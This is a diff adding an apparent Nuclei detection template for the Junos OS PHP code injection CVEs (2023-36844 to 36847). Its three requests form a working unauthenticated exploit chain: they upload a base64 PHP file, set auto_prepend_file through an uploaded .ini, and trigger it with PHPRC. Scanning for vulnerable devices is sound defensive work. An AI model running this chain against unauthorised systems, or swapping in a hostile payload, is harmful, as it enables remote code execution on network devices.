@@ -1,0 +1,45 @@
+id: watchtowr-vs-junos_juniper_2023-08-25
+
+info:
+  name: Junos OS PHP Code Injection Vulnerability
+  author: Aliz Hammond, Sonny (watchTowr)
+  severity: critical
+  description: |
+    This template detects a PHP code injection vulnerability in Junos OS as described in CVEs [CVE-2023-36844, CVE-2023-36845, CVE-2023-36846, CVE-2023-36847].
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-36844
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-36845
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-36846
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-36847
+  tags: cve, cve2023, junos, php, code-injection
+
+requests:
+  - method: POST
+    path: "{{BaseURL}}/webauth_operation.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "rs=do_upload&rsargs[0]=[{\"fileData\":\"data:text/html;base64,PD9waHAgZWNobygnd2F0Y2hUb3dyOjo6JyAuIHBocF91bmFtZSgpIC4gJzo6OnJ3b1RoY3RhdycpOz8+\",\"fileName\":\"watchTowr.php\",\"csize\":\"100\"}]"
+    matchers:
+      - type: regex
+        regex:
+          - "0: '([^']+)'},"
+        part: body
+
+  - method: POST
+    path: "{{BaseURL}}/webauth_operation.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "rs=do_upload&rsargs[0]=[{\"fileData\":\"data:plain/text;base64,YXV0b19wcmVwZW5kX2ZpbGU9Ii92YXIvdG1wL3dhdGNoVG93ci5waHAi\",\"fileName\":\"watchTowr.ini\",\"csize\":\"100\"}]"
+    matchers:
+      - type: regex
+        regex:
+          - "0: '([^']+)'},"
+        part: body
+
+  - method: GET
+    path: "{{BaseURL}}/webauth_operation.php?PHPRC=/var/tmp/watchTowr.ini"
+    matchers:
+      - type: regex
+        regex:
+          - "watchTowr:::(.*?):::rwoThctaw"
+        part: body
